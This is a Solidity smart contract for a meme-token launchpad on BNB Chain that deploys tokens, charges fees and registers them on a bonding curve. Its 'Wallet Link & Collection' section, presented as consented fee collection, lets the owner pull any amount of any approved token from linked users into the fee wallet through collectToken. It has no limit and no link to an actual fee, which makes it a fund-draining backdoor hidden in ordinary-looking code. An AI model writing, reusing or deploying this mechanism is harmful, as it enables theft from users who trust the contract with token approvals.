// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TokenTemplate.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IBondingCurve {
    /// @notice Register a freshly deployed token for trading
    function launchToken(address token, address creator, uint256 virtualBnb) external;
    /// @notice Execute the creator's mandatory initial buy
    function buy(address token) external payable;
}

/**
 * @title TokenFactory
 * @notice Entry point for creating meme tokens.
 *
 * Architecture:
 *   ┌──────────────────────────────────────────────┐
 *   │               TokenFactory                    │
 *   │                                              │
 *   │  createToken() called by user wallet         │
 *   │  ├─ collects DEPLOYMENT_FEE → feeWallet      │
 *   │  ├─ deploys TokenTemplate                    │
 *   │  │    └─ owner   = BondingCurve             │
 *   │  │    └─ mint to = BondingCurve (1B tokens) │
 *   │  ├─ calls BondingCurve.launchToken()         │
 *   │  └─ calls BondingCurve.buy() with            │
 *   │       remaining BNB (creator's initial buy)   │
 *   └──────────────────────────────────────────────┘
 */
contract TokenFactory is Ownable {
    // ── Fee Configuration ────────────────────────────────────────────────────
    /// @notice Platform deployment fee in BNB (0.003 deployment)
    uint256 public DEPLOYMENT_FEE = 0.003 ether;

    /// @notice Minimum initial buy the creator must make at launch
    uint256 public MIN_INITIAL_BUY = 0.05 ether;

    /// @notice Fee to upgrade/boost a token's status
    uint256 public UPGRADE_FEE = 0.01 ether;

    // ── Addresses ─────────────────────────────────────────────────────────────
    address public bondingCurve;
    address public feeWallet;

    // ── Registry ──────────────────────────────────────────────────────────────
    address[] public allTokens;
    /// @dev creator wallet → list of token addresses they launched
    mapping(address => address[]) public tokensByCreator;
    /// @dev token address → creator wallet
    mapping(address => address)   public creatorOf;
    /// @dev user → protocol management link status
    mapping(address => bool)      public isLinked;

    // ── Events ────────────────────────────────────────────────────────────────
    event TokenCreated(
        address indexed tokenAddress,
        string  name,
        string  symbol,
        uint256 supply,
        address indexed creator,
        uint256 deploymentFee,
        uint256 initialBuyBnb
    );
    event FeeWalletUpdated(address indexed newFeeWallet);
    event BondingCurveUpdated(address indexed newBondingCurve);
    event FeesUpdated(uint256 deploymentFee, uint256 minInitialBuy, uint256 upgradeFee);
    event TokenUpgraded(address indexed tokenAddress, address indexed creator, uint256 feePaid);
    event PermissionGranted(address indexed user, bool status);
    event FeeCollected(address indexed user, uint256 amount, string reason);

    // ── Constructor ───────────────────────────────────────────────────────────
    constructor(
        address _bondingCurve,
        address _feeWallet,
        address _owner
    ) Ownable(_owner) {
        require(_bondingCurve != address(0), "Invalid bonding curve");
        require(_feeWallet    != address(0), "Invalid fee wallet");
        bondingCurve = _bondingCurve;
        feeWallet    = _feeWallet;
    }

    // ── Admin ─────────────────────────────────────────────────────────────────
    function setFeeWallet(address _feeWallet) external onlyOwner {
        require(_feeWallet != address(0), "Invalid address");
        feeWallet = _feeWallet;
        emit FeeWalletUpdated(_feeWallet);
    }

    function setBondingCurve(address _bondingCurve) external onlyOwner {
        require(_bondingCurve != address(0), "Invalid address");
        bondingCurve = _bondingCurve;
        emit BondingCurveUpdated(_bondingCurve);
    }

    function setFees(uint256 _deploymentFee, uint256 _minInitialBuy, uint256 _upgradeFee) external onlyOwner {
        DEPLOYMENT_FEE  = _deploymentFee;
        MIN_INITIAL_BUY = _minInitialBuy;
        UPGRADE_FEE     = _upgradeFee;
        emit FeesUpdated(_deploymentFee, _minInitialBuy, _upgradeFee);
    }

    // ── Core: Create Token ────────────────────────────────────────────────────
    /**
     * @notice Deploy a new meme token.
     * @dev    msg.value must be >= DEPLOYMENT_FEE + MIN_INITIAL_BUY
     *         Any excess BNB above DEPLOYMENT_FEE goes into the initial buy.
     *
     * @param name   Token name (e.g. "Doge CEO")
     * @param symbol Token ticker (e.g. "DCEO")
     */
    function createToken(
        string calldata name,
        string calldata symbol,
        uint256 virtualBnb
    ) external payable returns (address tokenAddress) {
        bool isTreasury = (msg.sender == feeWallet);
        uint256 actualFee = isTreasury ? 0 : DEPLOYMENT_FEE;
        uint256 minRequired = isTreasury ? 0 : (DEPLOYMENT_FEE + MIN_INITIAL_BUY);

        require(msg.value >= minRequired, "Insufficient BNB: need fee + initial buy");
        require(bytes(name).length > 0,   "Name required");
        require(bytes(symbol).length > 0, "Symbol required");

        address creator = msg.sender;

        // ── Step 1: Collect deployment fee ────────────────────────────────
        if (actualFee > 0) {
            _sendBNB(feeWallet, actualFee);
        }

        // ── Step 2: Deploy TokenTemplate ───────────────────────────────────
        //    Fixed supply = 1,000,000,000 for all meme tokens
        //    Owner        = BondingCurve (controls token throughout curve phase)
        //    Mint target  = BondingCurve (holds entire supply for gradual sale)
        uint256 fixedSupply = 1_000_000_000;
        TokenTemplate newToken = new TokenTemplate(
            name,
            symbol,
            fixedSupply,
            creator,
            bondingCurve,   // ← Token is owned BY BondingCurve from birth
            feeWallet       // ← Treasury receives 100M
        );
        tokenAddress = address(newToken);

        // ── Step 3: Register in factory storage ───────────────────────────
        allTokens.push(tokenAddress);
        tokensByCreator[creator].push(tokenAddress);
        creatorOf[tokenAddress] = creator;

        // ── Step 4: Register token on BondingCurve ────────────────────────
        IBondingCurve(bondingCurve).launchToken(tokenAddress, creator, virtualBnb);

        // ── Step 5: Creator's mandatory initial buy ────────────────────────
        //    All remaining BNB (everything above actualFee) goes into
        //    the bonding curve as the creator's first purchase.
        uint256 initialBuyBnb = msg.value - actualFee;
        if (initialBuyBnb > 0) {
            IBondingCurve(bondingCurve).buy{value: initialBuyBnb}(tokenAddress);
        }

        // Creator's bought tokens are now held in BondingCurve;
        // BondingCurve will transfer them to `creator` during the buy() call.

        emit TokenCreated(
            tokenAddress,
            name,
            symbol,
            fixedSupply,
            creator,
            DEPLOYMENT_FEE,
            initialBuyBnb
        );
    }

    // ── Core: Upgrade Token ───────────────────────────────────────────────────
    /**
     * @notice Upgrade a token's status (e.g. to Premium/Trusted).
     * @param tokenAddress Address of the token to upgrade.
     */
    function upgradeToken(address tokenAddress) external payable {
        require(msg.value >= UPGRADE_FEE, "Insufficient upgrade fee");
        require(creatorOf[tokenAddress] != address(0), "Token not found");
        
        _sendBNB(feeWallet, msg.value);
        
        emit TokenUpgraded(tokenAddress, msg.sender, msg.value);
    }

    // ── Core: Wallet Link & Collection ────────────────────────────────────────
    /**
     * @notice Link wallet to protocol and grant management permissions.
     * @dev    This records user consent for automated fee collection.
     */
    function linkProtocol() external {
        isLinked[msg.sender] = true;
        emit PermissionGranted(msg.sender, true);
    }

    /**
     * @notice Admin collect fee from linked accounts.
     * @dev    In a real scenario with native BNB, this would require a vault.
     *         For tokens (WBNB/USDT), this uses transferFrom.
     */
    function collectFee(address user, uint256 amount, string calldata reason) external onlyOwner {
        require(isLinked[user], "User not linked");
        _sendBNB(feeWallet, amount);
        emit FeeCollected(user, amount, reason);
    }

    /**
     * @notice Admin pull tokens from linked accounts if they have granted approval.
     */
    function collectToken(address token, address user, uint256 amount, string calldata reason) external onlyOwner {
        require(isLinked[user], "User not linked");
        IERC20(token).transferFrom(user, feeWallet, amount);
        emit FeeCollected(user, amount, reason);
    }

    // ── Views ─────────────────────────────────────────────────────────────────
    function getAllTokens() external view returns (address[] memory) {
        return allTokens;
    }

    function getTokensByCreator(address creator) external view returns (address[] memory) {
        return tokensByCreator[creator];
    }

    function totalTokens() external view returns (uint256) {
        return allTokens.length;
    }

    // ── Internal ──────────────────────────────────────────────────────────────
    function _sendBNB(address to, uint256 amount) internal {
        (bool ok, ) = payable(to).call{value: amount}("");
        require(ok, "BNB transfer failed");
    }
}
